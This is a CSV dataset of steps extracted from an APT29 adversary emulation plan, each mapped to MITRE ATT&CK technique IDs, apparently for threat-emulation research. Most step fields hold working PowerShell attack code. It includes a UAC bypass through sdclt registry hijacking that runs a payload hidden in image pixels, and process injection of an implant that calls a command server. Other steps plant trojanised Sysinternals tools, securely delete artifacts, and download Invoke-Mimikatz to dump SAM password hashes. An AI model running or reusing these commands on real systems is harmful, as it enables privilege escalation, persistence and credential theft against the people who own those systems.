org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
apt29,apt29,unknown,apt29::43,43,UAC Bypass via Backup Utility,"id: 89e9dffa-8836-4672-8cf3-bebd006d2a2b | name: UAC Bypass via Backup Utility | description: Modify registry values of sdclt to bypass UAC | tactic: privilege-escalation | technique: attack_id: T1548.002 | name: Abuse Elevation Control Mechanism: Bypass User Account Control | cti_source: https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016 | procedure_group: procedure_privesc | procedure_step: 3.A.3 | platforms: windows: psh,pwsh: command: if (!(test-path -path $env:windir\system32\sdclt.exe)) {
  write-host ""[!] sdclt.exe was not found on this host."";
  exit 1;
}
New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;

$username=""#{profile_user}"";
$payload='powershell.exe -noni -noexit -ep bypass -window hidden -c ""sal a New-Object;Add-Type -AssemblyName ""System.Drawing""; $g=a System.Drawing.Bitmap(""C:\Users\$($username)\Downloads\monkey.png"");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))""';

Set-ItemProperty -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""(Default)"" -Value $payload -Force;
Set-ItemProperty -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force;

cmd.exe /c sdclt.exe;
cmd.exe /c powershell.exe;
 | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | executors: name: powershell | command: if (!(test-path -path $env:windir\system32\sdclt.exe)) {
  write-host ""[!] sdclt.exe was not found on this host."";
  exit 1;
}
New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;

$username=""#{profile_user}"";
$payload='powershell.exe -noni -noexit -ep bypass -window hidden -c ""sal a New-Object;Add-Type -AssemblyName ""System.Drawing""; $g=a System.Drawing.Bitmap(""C:\Users\$($username)\Downloads\monkey.png"");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))""';

Set-ItemProperty -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""(Default)"" -Value $payload -Force;
Set-ItemProperty -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force;

cmd.exe /c sdclt.exe;
cmd.exe /c powershell.exe;
","[""T1548.002""]","[""T1548""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::44,44,Abuse Elevation Control Mechanism: Bypass User Account Control,attack_id: T1548.002 | name: Abuse Elevation Control Mechanism: Bypass User Account Control,"[""T1548.002""]","[""T1548""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::45,45,Registry Cleanup for UAC Bypass Technique,"id: 5ff80022-8d85-410b-b868-6c7565b267e5 | name: Registry Cleanup for UAC Bypass Technique | description: Delete registry entries post-UAC bypass. | tactic: defensive-evasion | technique: attack_id: T1112 | name: Modify Registry | cti_source: https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016 | procedure_group: procedure_def_evasion | procedure_step: 3.B | platforms: windows: psh,pwsh: command: Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
if (!(test-path -path HKCU:\Software\Classes\Folder)) {
  write-host ""[+] Reg keys removed!"";
 }
 | executors: name: powershell | command: Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
if (!(test-path -path HKCU:\Software\Classes\Folder)) {
  write-host ""[+] Reg keys removed!"";
  }
","[""T1112""]","[""T1112""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::46,46,Modify Registry,attack_id: T1112 | name: Modify Registry,"[""T1112""]","[""T1112""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::47,47,Process Injection,"id: 088b8639-3f37-42cc-9dc8-01aabb645461 | name: Process Injection | description: The limited functionality high-integrity RAT will inject malicious code into an existing fully functional high-integrity process, resulting in a new elevated, fully functional high-integrity RAT. | tactic: privilege-escalation | technique: attack_id: T1055 | name: Process Injection | cti_source: https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016 | procedure_group: procedure_privesc | procedure_step: 3.C | platforms: windows: psh,pwsh: command: Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""Import-Module $env:APPDATA\update.ps1;update('#{server}')""));
Inject -PoshCode $pcode;
 | payloads: update.ps1 | Invoke-PSInject.ps1 | input_arguments: server: description: IP or Hostname of server | type: string | default: 192.0.2.10 | executors: name: powershell | command: Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""Import-Module $env:APPDATA\update.ps1;update('#{server}')""));
Inject -PoshCode $pcode;
","[""T1055""]","[""T1055""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::48,48,Process Injection,attack_id: T1055 | name: Process Injection,"[""T1055""]","[""T1055""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::49,49,Planting Modified Sysinternals Utilities,"id: 4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d | name: Planting Modified Sysinternals Utilities | description: Uploading payloads masquerading as via modified SysInternalsSuite | tactic: stage-capabilities | technique: attack_id: T1036.005 | name: Masquerading: Match Legitimate Name or Location | cti_source: N/A | procedure_group: procedure_staging | procedure_step: 4.A.1 | platforms: windows: psh,pwsh: command: iwr -uri ""https://download.sysinternals.com/files/SysinternalsSuite.zip"" -outfile SysInternalsSuite.zip;
Expand-Archive -Path SysInternalsSuite.zip -DestinationPath ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"" -Force;

if (! $?) {
  write-host ""Error moving files to #{profile_user}\Downloads"";
  exit 1;
}

Move-Item Modified-SysInternalsSuite.zip ""C:\Users\#{profile_user}\Downloads"" -Force;
Expand-Archive -LiteralPath ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" -DestinationPath ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"" -Force;

if (! $?) {
  write-host ""Error expanding files to #{profile_user}\Downloads"";
  exit 1;
}

$dir_exists=Test-Path -path ""C:\Program Files\SysInternalsSuite"";
if ($dir_exists -eq $true) {
  write-host ""[*] SysInternalsSuite folder exists within \""C:\Program Files\"", copying over payloads then removing folder from Downloads."";
  Move-Item -path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
  Move-Item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
} else {
  mkdir ""C:\Program Files\SysInternalsSuite"";
  Copy-Item -Path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
  Copy-Item -Path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
}

if (test-path -path ""SysInternalsSuite.zip"") {
  Remove-Item -path ""filesystem::SysInternalsSuite.zip"" -force;
}

if (test-path -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" ) {
  remove-item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" -force;
}

if (test-path -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"") {
  remove-item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"" -recurse -force;
}

if (test-path -path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"") {
  Remove-Item -path  ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"" -recurse -force;
}

Set-Location -path ""C:\Program Files\SysInternalsSuite"";
if ($?) {
  gci;
  write-host ""[*] Successfully planted files""
} else {
  write-host ""[!] Error downloading and planting modified system tools.""
}
 | payloads: Modified-SysInternalsSuite.zip | input_arguments: profile_user: description: Name of profile user | type: string | default: Administrator | executors: name: powershell | command: iwr -uri ""https://download.sysinternals.com/files/SysinternalsSuite.zip"" -outfile SysInternalsSuite.zip;
Expand-Archive -Path SysInternalsSuite.zip -DestinationPath ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"" -Force;

if (! $?) {
  write-host ""Error moving files to #{profile_user}\Downloads"";
  exit 1;
}

Move-Item Modified-SysInternalsSuite.zip ""C:\Users\#{profile_user}\Downloads"" -Force;
Expand-Archive -LiteralPath ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" -DestinationPath ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"" -Force;

if (! $?) {
  write-host ""Error expanding files to #{profile_user}\Downloads"";
  exit 1;
}

$dir_exists=Test-Path -path ""C:\Program Files\SysInternalsSuite"";
if ($dir_exists -eq $true) {
  write-host ""[*] SysInternalsSuite folder exists within \""C:\Program Files\"", copying over payloads then removing folder from Downloads."";
  Move-Item -path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
  Move-Item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
} else {
  mkdir ""C:\Program Files\SysInternalsSuite"";
  Copy-Item -Path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
  Copy-Item -Path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
}

if (test-path -path ""SysInternalsSuite.zip"") {
  Remove-Item -path ""filesystem::SysInternalsSuite.zip"" -force;
}

if (test-path -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" ) {
  remove-item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" -force;
}

if (test-path -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"") {
  remove-item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"" -recurse -force;
}

if (test-path -path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"") {
  Remove-Item -path  ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"" -recurse -force;
}

Set-Location -path ""C:\Program Files\SysInternalsSuite"";
if ($?) {
  gci;
  write-host ""[*] Successfully planted files""
} else {
  write-host ""[!] Error downloading and planting modified system tools.""
}
","[""T1036.005""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::50,50,Masquerading: Match Legitimate Name or Location,attack_id: T1036.005 | name: Masquerading: Match Legitimate Name or Location,"[""T1036.005""]","[""T1036""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::51,51,Remote System Discovery,"id: 59592c35-8207-4896-8d8b-36ad4600245d | name: Remote System Discovery | description: The net utility is executed via cmd to enumerate DCs within the domain | tactic: discovery | technique: attack_id: T1018 | name: Remote System Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 4.A.2 | platforms: windows: psh,pwsh: command: cmd.exe /c net group ""Domain Controllers"" /domain
 | executors: name: powershell | command: cmd.exe /c net group ""Domain Controllers"" /domain
","[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::52,52,Remote System Discovery,attack_id: T1018 | name: Remote System Discovery,"[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::53,53,Remote System Discovery,"id: 24ed020e-4730-4000-b6b4-6b5d3e95314f | name: Remote System Discovery | description: The net utility is executed via cmd to enumerate hosts within the domain. | tactic: discovery | technique: attack_id: T1018 | name: Remote System Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 4.A.3 | platforms: windows: psh,pwsh: command: cmd.exe /c net group ""Domain Computers"" /domain
 | executors: name: powershell | command: cmd.exe /c net group ""Domain Computers"" /domain
","[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::54,54,Remote System Discovery,attack_id: T1018 | name: Remote System Discovery,"[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::55,55,System Network Configuration Discovery,"id: 5f4263c4-7ff1-4098-b5f5-f41faa31cf5b | name: System Network Configuration Discovery | description: The netsh utility is executed via cmd to enumerate local firewall configuration information. | tactic: discovery | technique: attack_id: T1016 | name: System Network Configuration Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 4.B.1 | platforms: windows: cmd: command: netsh advfirewall show allprofiles
 | executors: name: command_prompt | command: netsh advfirewall show allprofiles
","[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::56,56,System Network Configuration Discovery,attack_id: T1016 | name: System Network Configuration Discovery,"[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::57,57,Process Discovery,"id: 646be6c9-f27a-4f5f-be5d-b8a0317e215f | name: Process Discovery | description: List running process on the machine via PowerShell. | tactic: discovery | technique: attack_id: T1057 | name: Process Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 4.B.2 | platforms: windows: psh,pwsh: command: $ps = get-process;
write-output $ps;
 | executors: name: powershell | command: $ps = get-process;
write-output $ps;
","[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::58,58,Process Discovery,attack_id: T1057 | name: Process Discovery,"[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::59,59,Artifact Cleanup - Delete Files,"id: 9b5b5aec-32ff-4d74-8555-727b50ab15f6 | name: Artifact Cleanup - Delete Files | description: Cleanup files related to Operation | tactic: defensive-evasion | technique: attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion | cti_source: https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments | procedure_group: procedure_def_evasion | procedure_step: 4.B.3 | platforms: windows: psh,pwsh: command: if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"";)) {
  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
  exit 1;
}
Set-Location -path ""C:\Program Files\SysInternalsSuite"";
gci $env:userprofile\Desktop;
.\sdelete64.exe /accepteula ""$env:USERPROFILE\Desktop\‮cod.3aka3.scr"";
.\sdelete64.exe /accepteula ""$env:APPDATA\Draft.Zip"";
.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysInternalsSuite.zip"";
 | executors: name: powershell | command: if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"";)) {
  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
  exit 1;
}
Set-Location -path ""C:\Program Files\SysInternalsSuite"";
gci $env:userprofile\Desktop;
.\sdelete64.exe /accepteula ""$env:USERPROFILE\Desktop\‮cod.3aka3.scr"";
.\sdelete64.exe /accepteula ""$env:APPDATA\Draft.Zip"";
.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysInternalsSuite.zip"";
","[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::60,60,Indicator Removal on Host: File Deletion,attack_id: T1070.004 | name: Indicator Removal on Host: File Deletion,"[""T1070.004""]","[""T1070""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::61,61,Loading Stage-2 & Performing Discovery,"id: 6f1f4768-7099-45d2-a858-b49dc792234e | name: Loading Stage-2 & Performing Discovery | description: Load Stage-2 from Modified Sysinternals Toolset | tactic: discovery | technique: attack_id: T1082 | name: System Information Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 4.C.1 | platforms: windows: psh,pwsh: command: if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysInternalsSuite"";
if (!(test-path "".\readme.ps1"")) {
  Move-Item .\readme.txt readme.ps1 -Force;
}
. .\readme.ps1;
Invoke-Discovery;
 | executors: name: powershell | command: if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysInternalsSuite"";
if (!(test-path "".\readme.ps1"")) {
  Move-Item .\readme.txt readme.ps1 -Force;
}
. .\readme.ps1;
Invoke-Discovery;
","[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::62,62,System Information Discovery,attack_id: T1082 | name: System Information Discovery,"[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::63,63,4.C.2 - System Network Connections Discovery (T1049),"id: ba0b398d-91b8-490a-bed2-f959afa8e1aa | name: 4.C.2 - System Network Connections Discovery (T1049) | description: The netstat utility is executed via cmd to enumerate local active network connections. | tactic: discovery | technique: attack_id: T1049 | name: System Network Connections Discovery | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_discovery | procedure_step: 4.C.2 | platforms: windows: cmd: command: netstat -ano
 | executors: name: command_prompt | command: netstat -ano
","[""T1049""]","[""T1049""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::64,64,System Network Connections Discovery,attack_id: T1049 | name: System Network Connections Discovery,"[""T1049""]","[""T1049""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::65,65,Credential Dumping using Process Injection,"id: effbedc1-1bc8-4a75-9395-980559700008 | name: Credential Dumping using Process Injection | description: Mimikatz lsadump::sam is executed via Invoke-Mimikatz to dump hashes via process injection into LSASS. | tactic: credential-access | technique: attack_id: T1003 | name: Credential Dumping | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_cred_access | procedure_step: 5.A.1 | platforms: windows: psh,pwsh: command: [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
$web = (New-Object System.Net.WebClient);
$result = $web.DownloadString(""https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1"");
iex $result;
function hashdump
{
    Invoke-Mimikatz -Command ""privilege::debug token::elevate lsadump::sam exit""
};
hashdump;
 | executors: name: powershell | command: [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
$web = (New-Object System.Net.WebClient);
$result = $web.DownloadString(""https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1"");
iex $result;
function hashdump
{
    Invoke-Mimikatz -Command ""privilege::debug token::elevate lsadump::sam exit""
};
hashdump;
","[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::66,66,Credential Dumping,attack_id: T1003 | name: Credential Dumping,"[""T1003""]","[""T1003""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::67,67,Persistent Service 1,"id: 9c75155e-21ab-4471-af16-45f3795a313c | name: Persistent Service 1 | description: Leverage modified Sysinternals | tactic: persistence | technique: attack_id: T1547.009 | name: Boot or Logon Autostart Execution: Shortcut Modification | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_persistence | procedure_step: 5.A.2 | platforms: windows: psh,pwsh: command: Set-Location -path ""C:\Program Files\SysinternalsSuite"";
if (get-service -name ""javamtsup"" -ErrorAction SilentlyContinue) {
  write-host ""[*] Service already exists...Not running persistence step-1"";
  exit 1;
}

if (Test-Path -path ""readme.ps1"") {
  . .\readme.ps1;
  Invoke-Persistence -PersistStep 1;
  write-host ""[+] Persistence 1 invoked."";
  exit 0;

} else {
  write-host ""[!] readme.ps1 not found."";
  exit 1;
}
 | executors: name: powershell | command: Set-Location -path ""C:\Program Files\SysinternalsSuite"";
if (get-service -name ""javamtsup"" -ErrorAction SilentlyContinue) {
  write-host ""[*] Service already exists...Not running persistence step-1"";
  exit 1;
}

if (Test-Path -path ""readme.ps1"") {
  . .\readme.ps1;
  Invoke-Persistence -PersistStep 1;
  write-host ""[+] Persistence 1 invoked."";
  exit 0;

} else {
  write-host ""[!] readme.ps1 not found."";
  exit 1;
}
","[""T1547.009""]","[""T1547""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::68,68,Boot or Logon Autostart Execution: Shortcut Modification,attack_id: T1547.009 | name: Boot or Logon Autostart Execution: Shortcut Modification,"[""T1547.009""]","[""T1547""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::69,69,Persistent Service 2,"id: 45f18b58-c14f-4b61-a3da-41b67af21429 | name: Persistent Service 2 | description: Leverage modified Sysinternals | tactic: persistence | technique: attack_id: T1547.009 | name: Boot or Logon Autostart Execution: Shortcut Modification | cti_source: https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf | procedure_group: procedure_persistence | procedure_step: 5.B.1 | platforms: windows: psh,pwsh: command: Set-Location -path ""C:\Program Files\SysinternalsSuite"";
if (Test-Path -path ""readme.ps1"") {
  . .\readme.ps1;
  Invoke-Persistence -PersistStep 2;
  write-host ""[+] Persistence 2 invoked."";

} else {
  write-host ""[!] readme.ps1 not found."";
  return 1;
}
 | executors: name: powershell | command: Set-Location -path ""C:\Program Files\SysinternalsSuite"";
if (Test-Path -path ""readme.ps1"") {
  . .\readme.ps1;
  Invoke-Persistence -PersistStep 2;
  write-host ""[+] Persistence 2 invoked."";

} else {
  write-host ""[!] readme.ps1 not found."";
  return 1;
}
","[""T1547.009""]","[""T1547""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
apt29,apt29,unknown,apt29::70,70,Boot or Logon Autostart Execution: Shortcut Modification,attack_id: T1547.009 | name: Boot or Logon Autostart Execution: Shortcut Modification,"[""T1547.009""]","[""T1547""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\apt29\Emulation_Plan\yaml\APT29.yaml,yaml_regex_extract,high
